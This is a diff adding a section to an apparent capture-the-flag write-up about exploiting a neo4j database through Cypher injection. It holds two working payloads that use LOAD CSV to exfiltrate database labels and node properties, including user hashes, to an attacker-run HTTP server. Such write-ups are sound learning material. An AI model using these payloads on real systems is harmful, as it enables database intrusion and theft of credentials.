@@ -98,7 +98,30 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ![image](https://github.com/user-attachments/assets/bb3610b1-c224-4c9b-9544-c050803b49ba)
 
-- I discovered it is a neo4j database which is a graph type of  database.A graph database is defined as a specialized, single-purpose platform for creating and manipulating graphs. Graphs contain nodes, edges, and properties, all of which are used to represent and store data in a way that relational databases are not equipped to do as explained [here](https://www.oracle.com/ng/autonomous-database/what-is-graph-database/).I got an interesting [article](https://hackmd.io/@Chivato/rkAN7Q9NY#Fun-with-Cypher-Injections) to exploit it.
-- 
+- I discovered it is a neo4j database which is a graph type of  database.A graph database is defined as a specialized, single-purpose platform for creating and manipulating graphs. Graphs contain nodes, edges, and properties, all of which are used to represent and store data in a way that relational databases are not equipped to do as explained [here](https://www.oracle.com/ng/autonomous-database/what-is-graph-database/).I got an interesting [article](https://hackmd.io/@Chivato/rkAN7Q9NY#Fun-with-Cypher-Injections) to exploit it.The vulnerability is termed `cypher injection`.
 
+---------------------
 
+### Data exfiltration from neo4j db with SSRF [Rabbit hole]
+
+----------------------
+
+- A key method to exfiltrate nodes im a neo4j db is `SSRF`.Before exploiting and reading data, we have to read the nodes and this achieved through the `CALL data.labels()` function.First of all,set a python `http.server`,Query-:
+
+```query
+' OR 1=1 WITH 1337 AS x CALL db.labels() YIELD label AS d LOAD CSV FROM 'http://[http server]/[point to an actual file]?help='+d AS y RETURN y//
+```
+- Result-:
+
+![image](https://github.com/user-attachments/assets/ccc8a69c-14f6-4d86-88d2-7df6555bed74)
+
+- Read nodes with -:
+```query 
+1' OR 1=1 WITH 1 as a MATCH (f:<node>) UNWIND keys(f) as p LOAD CSV FROM 'http://<server>/<point to a real file>?' + p +'='+toString(f[p]) as l RETURN 0 as _0 //
+```
+
+- Result for node `USER`,`SHA1`-:
+
+![image](https://github.com/user-attachments/assets/1be00b57-3d91-43b0-aeaf-c609d019ce64)
+
+- Rabbit hole concluded
